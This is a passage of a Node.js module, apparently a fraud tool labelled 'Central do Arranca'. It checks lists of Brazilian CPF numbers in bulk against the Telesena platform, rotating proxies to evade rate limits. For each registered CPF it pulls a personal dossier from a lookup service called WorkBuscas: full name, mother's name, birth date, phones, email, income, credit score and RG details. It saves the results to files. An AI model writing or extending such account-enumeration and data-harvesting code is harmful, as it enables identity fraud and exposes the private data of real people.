          this.proxies = this.proxies.filter(p => !(p.proxy_address === usedProxy.host && p.port === usedProxy.port));
        } else if (usedProxy && usedProxy.isRotate && (isTimeout || isUnknown || isRateLimited || isNetworkStatus)) {
          console.log(`[Telesena] ⚠️ Proxy rotate com problema (status: ${result.status}) - não removendo (é rotate)`);
        }

        lastError = err || `Status ${result.status}`;
        attempts++;
      }

      // Se ainda não obteve sucesso, tenta sem proxy
      if (!result || !result.success) {
        result = await this.makeAPIRequest(cpf, null);
        if (!result.success && (/rate_limited/i.test(String(result.error)) || result.status === 429)) {
          return {
            cpf: cpf,
            success: false,
            error: 'rate_limited',
            status: result.status || 429,
            proxy: 'Sem Proxy'
          };
        }
      }
      
      // Se encontrou CPF registrado, consulta API WorkBuscas para dados complementares
      if (result && result.success && result.interpretation === 'registered') {
        try {
          const workbuscasData = await this.consultWorkBuscas(cpf);
          if (workbuscasData) {
            result.workbuscas = workbuscasData;
          } else {
            console.warn(`[Telesena] Nenhum dado do WorkBuscas retornado para CPF ${cpf}`);
          }
        } catch (error) {
          // Não falha a requisição se WorkBuscas falhar
          console.warn(`[Telesena] Erro ao consultar WorkBuscas para CPF ${cpf}:`, error.message);
        }
      }
      
      const endTime = Date.now();
      result.duration = endTime - startTime;
      
      return result;
      
    } catch (error) {
      const endTime = Date.now();
      return {
        cpf: cpf,
        success: false,
        error: error.message,
        status: error.response?.status || 0,
        duration: endTime - startTime,
        proxy: 'Error'
      };
    }
  }

  /**
   * Verifica múltiplos CPFs em lotes com proxies rotativos
   */
  async checkMultipleCPFs(cpfs, statusCallback = null) {
    const results = [];
    
    if (this.proxies.length === 0) {
      await this.loadProxies();
    }
    
    for (let i = 0; i < cpfs.length; i += this.batchSize) {
      const batch = cpfs.slice(i, i + this.batchSize);
      const batchNumber = Math.floor(i / this.batchSize) + 1;
      const totalBatches = Math.ceil(cpfs.length / this.batchSize);
      
      // Processa CPFs SEQUENCIALMENTE para evitar rate limit simultâneo
      const batchResults = [];
      for (let index = 0; index < batch.length; index++) {
        const cpf = batch[index];
        try {
          if (index > 0) {
            await this.sleep(200);
          }
          
          const result = await this.checkCPF(cpf, true);
          if (!result.timestamp) {
            result.timestamp = new Date().toISOString();
          }
          this.results.push(result);
          
          const status = result.interpretation === 'registered' ? 'CADASTRADO' : 'NÃO CADASTRADO';
          if (status === 'CADASTRADO') {
            console.log(`✅ [Telesena] CPF ${cpf} CADASTRADO`);
          }
          
          batchResults.push(result);
        } catch (error) {
          console.error(`❌ Erro ao verificar CPF ${cpf}:`, error.message);
          this.errorCount++;
          const failed = {
            cpf: cpf,
            success: false,
            error: error.message,
            timestamp: new Date().toISOString(),
            proxy: null
          };
          this.results.push(failed);
          batchResults.push(failed);
        }
      }
      
      results.push(...batchResults);
      
      if (i + this.batchSize < cpfs.length) {
        await this.sleep(this.delay);
      }
    }
    
    return results;
  }

  /**
   * Salva resultados em arquivo
   */
  async saveResults(filename = null) {
    if (!filename) {
      const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
      filename = path.join(__dirname, '../../lista/telesena-valid-cpfs-' + timestamp + '.txt');
    }

    const validCPFs = this.results.filter(result => 
      result.success && result.interpretation === 'registered'
    );

    if (validCPFs.length === 0) {
      console.log('Nenhum CPF válido encontrado para salvar.');
      return;
    }

    let txtContent = '';
    txtContent += '🔍 CENTRAL DO ARRANCA - CPFs VÁLIDOS ENCONTRADOS (TELESENA)\n';
    txtContent += '='.repeat(60) + '\n\n';
    txtContent += `📅 Data/Hora: ${new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' })}\n`;
    txtContent += `📊 Total de CPFs válidos: ${validCPFs.length}\n`;
    txtContent += `📝 Nota: Apenas CPFs com cadastro na plataforma Telesena\n\n`;
    txtContent += '='.repeat(60) + '\n\n';

    validCPFs.forEach((result, index) => {
      txtContent += `📋 CPF ${index + 1}:\n`;
      txtContent += `   🔢 CPF: ${result.cpf}\n`;
      txtContent += `   ✅ Status: CADASTRADO\n`;
      
      if (result.emailMascarado) {
        txtContent += `   📧 Email (mascarado - Telesena): ${result.emailMascarado}\n`;
      }
      
      if (result.finalTelefone) {
        txtContent += `   📱 Final do Telefone (Telesena): ${result.finalTelefone}\n`;
      }
      
      txtContent += `   🌐 Proxy usado: ${result.proxy || 'Sem Proxy'}\n`;
      txtContent += `   ⏰ Verificado em: ${new Date(result.timestamp).toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' })}\n\n`;
      
      // Dados complementares da API WorkBuscas
      if (result.workbuscas) {
        txtContent += `   📊 DADOS COMPLEMENTARES (WorkBuscas):\n`;
        
        if (result.workbuscas.nome) {
          txtContent += `      📛 Nome Completo: ${result.workbuscas.nome}\n`;
        }
        
        if (result.workbuscas.nomeMae) {
          txtContent += `      👩 Nome da Mãe: ${result.workbuscas.nomeMae}\n`;
        }
        
        if (result.workbuscas.dataNascimento) {
          txtContent += `      📅 Data de Nascimento: ${result.workbuscas.dataNascimento}\n`;
        }
        
        // Telefones (todos os telefones disponíveis)
        if (result.workbuscas.telefones && Array.isArray(result.workbuscas.telefones) && result.workbuscas.telefones.length > 0) {
          txtContent += `      📱 Telefones (${result.workbuscas.telefones.length}):\n`;
          result.workbuscas.telefones.forEach((tel, telIndex) => {
            let telInfo = `         ${telIndex + 1}. ${tel.numero}`;
            if (tel.operadora && tel.operadora !== 'Não informado') {
              telInfo += ` (${tel.operadora})`;
            }
            if (tel.tipo) {
              telInfo += ` - ${tel.tipo}`;
            }
            if (tel.whatsapp !== null && tel.whatsapp !== undefined) {
              telInfo += tel.whatsapp ? ` ✓ WhatsApp` : '';
            }
            txtContent += `${telInfo}\n`;
          });
        } else if (result.workbuscas.telefone) {
          txtContent += `      📱 Telefone: ${result.workbuscas.telefone}\n`;
        }
        
        if (result.workbuscas.email) {
          txtContent += `      📧 Email: ${result.workbuscas.email}\n`;
        }
        
        if (result.workbuscas.renda) {
          txtContent += `      💰 Renda: R$ ${result.workbuscas.renda}\n`;
        }
        
        if (result.workbuscas.score) {
          txtContent += `      📈 Score CSB: ${result.workbuscas.score}\n`;
        }
        
        if (result.workbuscas.rg) {
          let rgInfo = `      🆔 RG: ${result.workbuscas.rg}`;
          if (result.workbuscas.rgOrgaoEmissor) {
            rgInfo += ` - ${result.workbuscas.rgOrgaoEmissor}`;
          }
          if (result.workbuscas.rgUfEmissao) {
            rgInfo += ` (${result.workbuscas.rgUfEmissao})`;
          }
          txtContent += `${rgInfo}\n`;
          if (result.workbuscas.rgDataEmissao) {
            txtContent += `         📅 Data de Emissão do RG: ${result.workbuscas.rgDataEmissao}\n`;
          }
        }
        
        txtContent += `\n`;
      }
      
      txtContent += '─'.repeat(40) + '\n\n';
    });

    try {
      const listaDir = path.join(__dirname, '../../lista');
      if (!fs.existsSync(listaDir)) {
        fs.mkdirSync(listaDir, { recursive: true });
      }
      
      if (!path.isAbsolute(filename)) {
        filename = path.join(listaDir, path.basename(filename));
      }
      
      await fs.writeFile(filename, txtContent, 'utf8');
    } catch (error) {
      console.log('❌ [Telesena] Erro ao salvar resultados:', error.message);
    }
  }

  /**
   * Exibe resumo das verificações
   */
  showSummary() {
    console.log('\n' + '='.repeat(50));
    console.log('📊 RESUMO DAS VERIFICAÇÕES - TELESENA');
    console.log('='.repeat(50));
    console.log(`✅ Sucessos: ${this.successCount}`);
    console.log(`❌ Erros: ${this.errorCount}`);
    console.log(`👤 CPFs cadastrados: ${this.registeredCount}`);
    console.log(`❌ CPFs não cadastrados: ${this.unregisteredCount}`);
    console.log(`🌐 Proxies disponíveis: ${this.proxies.length}`);
    console.log('='.repeat(50));
  }

  /**
   * Função de sleep
   */
  sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
}

module.exports = TelesenaChecker;

